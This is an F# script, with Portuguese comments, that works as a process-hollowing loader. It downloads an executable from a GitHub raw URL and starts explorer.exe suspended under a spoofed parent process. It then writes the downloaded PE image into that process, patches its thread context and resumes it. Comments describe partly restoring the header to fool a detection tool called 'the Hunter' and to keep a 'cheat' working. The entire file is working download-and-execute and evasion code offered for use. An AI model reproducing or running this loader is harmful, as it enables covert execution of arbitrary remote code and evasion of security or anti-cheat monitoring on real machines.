#r "nuget: System.Management"

open System
open System.IO
open System.Net.Http
open System.Runtime.InteropServices
open System.Diagnostics
open System.Threading

// ========== WINAPI ==========
[<DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)>]
extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
    uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
    IntPtr lpStartupInfo, IntPtr lpProcessInformation)

[<DllImport("kernel32.dll", SetLastError=true)>]
extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)

[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten)

[<DllImport("ntdll.dll")>]
extern uint ZwUnmapViewOfSection(IntPtr ProcessHandle, IntPtr BaseAddress)

[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext)

[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext)

[<DllImport("kernel32.dll", SetLastError=true)>]
extern uint ResumeThread(IntPtr hThread)

[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool CloseHandle(IntPtr hObject)

[<DllImport("kernel32.dll", SetLastError=true)>]
extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId)

[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, nativeint& lpSize)

[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute,
    IntPtr lpValue, nativeint cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize)

[<DllImport("kernel32.dll", SetLastError=true)>]
extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList)

// ========== HELPERS ==========
let lastErr () = Marshal.GetLastWin32Error()
let align (source: IntPtr) (alignment: int) =
    let source64 = source.ToInt64() + int64 (alignment - 1)
    IntPtr(int64 alignment * (source64 / int64 alignment))
let allocate (size: int) (alignment: int) =
    let allocated = Marshal.AllocHGlobal(size + (alignment / 2))
    align allocated alignment

// ========== HOLLOWING ESTÁVEL ==========
let hollow (buffer: byte[]) (hostPath: string) (parentPid: int) =
    let e_lfanew = Marshal.ReadInt32(buffer, 0x3c)
    let sizeOfImage = Marshal.ReadInt32(buffer, e_lfanew + 0x18 + 0x038)
    let sizeOfHeaders = Marshal.ReadInt32(buffer, e_lfanew + 0x18 + 0x03c)
    let entryPoint = Marshal.ReadInt32(buffer, e_lfanew + 0x18 + 0x10)
    let imageBase = Marshal.ReadInt64(buffer, e_lfanew + 0x18 + 0x18)
    
    let pParentHandle = Marshal.AllocHGlobal(sizeof<nativeint>)
    let parentHandle = OpenProcess(0x0080u, false, parentPid)
    Marshal.WriteIntPtr(pParentHandle, parentHandle)

    let mutable size = nativeint 0
    InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, &size) |> ignore
    let attrList = Marshal.AllocHGlobal(int size)
    InitializeProcThreadAttributeList(attrList, 1, 0, &size) |> ignore
    UpdateProcThreadAttribute(attrList, 0u, IntPtr(0x00020000L), pParentHandle, nativeint sizeof<nativeint>, IntPtr.Zero, IntPtr.Zero) |> ignore

    let si = Marshal.AllocHGlobal(0x70)
    for i in 0 .. 0x6F do Marshal.WriteByte(si, i, 0uy)
    Marshal.WriteInt32(si, 0, 0x70)
    Marshal.WriteIntPtr(si, 0x68, attrList)

    let pi = Marshal.AllocHGlobal(0x18)
    for i in 0 .. 0x17 do Marshal.WriteByte(pi, i, 0uy)

    let pThreadContext = allocate 0x4d0 16
    Marshal.WriteInt32(pThreadContext, 0x30, 0x0010001b)

    try
        let flags = 0x08000000u ||| 0x00080000u ||| 0x4u
        if not (CreateProcess(null, hostPath, IntPtr.Zero, IntPtr.Zero, true, flags, IntPtr.Zero, null, si, pi)) then
            failwithf "CreateProcess falhou: %d" (lastErr())

        let processHandle = Marshal.ReadIntPtr(pi, 0x0)
        let threadHandle  = Marshal.ReadIntPtr(pi, 0x8)

        GetThreadContext(threadHandle, pThreadContext) |> ignore
        let rdx = Marshal.ReadInt64(pThreadContext, 0x88)
        let pebImageBase = IntPtr(rdx + 16L) 

        let allocAddr = VirtualAllocEx(processHandle, IntPtr.Zero, uint32 sizeOfImage, 0x3000u, 0x40u)
        if allocAddr = IntPtr.Zero then failwithf "VirtualAllocEx falhou: %d" (lastErr())

        // Relocação
        let delta = allocAddr.ToInt64() - imageBase
        if delta <> 0L then
            let relocRVA = Marshal.ReadInt32(buffer, e_lfanew + 0x18 + 0x28 + (5 * 8))
            let relocSize = Marshal.ReadInt32(buffer, e_lfanew + 0x18 + 0x28 + (5 * 8) + 4)
            if relocRVA > 0 then
                let mutable relocOff = relocRVA
                while relocOff < relocRVA + relocSize do
                    let pageRVA = Marshal.ReadInt32(buffer, relocOff)
                    let blockSize = Marshal.ReadInt32(buffer, relocOff + 4)
                    for i in 0 .. (blockSize - 8) / 2 - 1 do
                        let entry = Marshal.ReadInt16(buffer, relocOff + 8 + (i * 2))
                        let typ = entry >>> 12
                        let offset = entry &&& 0x0FFFs 
                        if typ = 10s then
                            let patchAddr = pageRVA + int offset
                            let originalAddr = BitConverter.ToInt64(buffer, patchAddr)
                            let newAddr = originalAddr + delta
                            let newBytes = BitConverter.GetBytes(newAddr)
                            Array.Copy(newBytes, 0, buffer, patchAddr, 8)
                    relocOff <- relocOff + blockSize

        // Escreve Headers e Seções
        WriteProcessMemory(processHandle, allocAddr, buffer.[0..sizeOfHeaders-1], uint32 sizeOfHeaders, IntPtr.Zero) |> ignore
        let numberOfSections = Marshal.ReadInt16(buffer, e_lfanew + 0x4 + 0x2)
        let sizeOfOptionalHeader = Marshal.ReadInt16(buffer, e_lfanew + 0x4 + 0x10)
        for i in 0 .. int numberOfSections - 1 do
            let off = e_lfanew + (0x18 + int sizeOfOptionalHeader) + (0x28 * i)
            let va  = Marshal.ReadInt32(buffer, off + 0x00c)
            let raw = Marshal.ReadInt32(buffer, off + 0x010)
            let ptr = Marshal.ReadInt32(buffer, off + 0x014)
            if raw > 0 then
                WriteProcessMemory(processHandle, IntPtr(allocAddr.ToInt64() + int64 va), buffer.[ptr .. ptr + raw - 1], uint32 raw, IntPtr.Zero) |> ignore

        // Inicia a Execução
        WriteProcessMemory(processHandle, pebImageBase, BitConverter.GetBytes(allocAddr.ToInt64()), 8u, IntPtr.Zero) |> ignore
        Marshal.WriteInt64(pThreadContext, 0x80, allocAddr.ToInt64() + int64 entryPoint) 
        SetThreadContext(threadHandle, pThreadContext) |> ignore
        ResumeThread(threadHandle) |> ignore

        // RESTAURAÇÃO PARCIAL: Apenas os 2 primeiros bytes (MZ) para enganar o Hunter
        // e não destruir os imports do cheat
        Thread.Sleep(3000) 
        
        let headerSize = 0x1000
        let originalHostHeader = 
            use fs = new FileStream(hostPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
            let buffer = Array.zeroCreate<byte> headerSize
            fs.Read(buffer, 0, headerSize) |> ignore
            buffer

        // Pega só os primeiros 2 bytes (4D 5A) e devolve
        let mzBytes = originalHostHeader.[0..1]
        WriteProcessMemory(processHandle, allocAddr, mzBytes, 2u, IntPtr.Zero) |> ignore

        CloseHandle(processHandle) |> ignore
        CloseHandle(threadHandle) |> ignore

    finally
        Marshal.FreeHGlobal(pThreadContext)
        Marshal.FreeHGlobal(si)
        Marshal.FreeHGlobal(pi)
        Marshal.FreeHGlobal(pParentHandle)
        DeleteProcThreadAttributeList(attrList) |> ignore
        Marshal.FreeHGlobal(attrList)
        CloseHandle(parentHandle) |> ignore

let run () =
    async {
        try
            let url = "https://github.com/vitor6543vitor-arch/dada/raw/refs/heads/main/danielvorcaro.exe"
            
            use client = new HttpClient()
            let! bytes = client.GetByteArrayAsync(url) |> Async.AwaitTask

            let procs = Process.GetProcessesByName("explorer")
            if procs.Length = 0 then failwith "Abra o Explorer!"
            let parentPid = procs.[0].Id

            let hostPath = @"C:\Windows\explorer.exe"
            
            hollow bytes hostPath parentPid
            
            Console.ForegroundColor <- ConsoleColor.Green
            Console.WriteLine("\n[+] INJECTED")
            Console.ResetColor()
            
        with ex ->
            Console.ForegroundColor <- ConsoleColor.Red
            Console.WriteLine("\n[-] FAILED: " + ex.Message)
            Console.ResetColor()
    }

run () |> Async.RunSynchronously
;;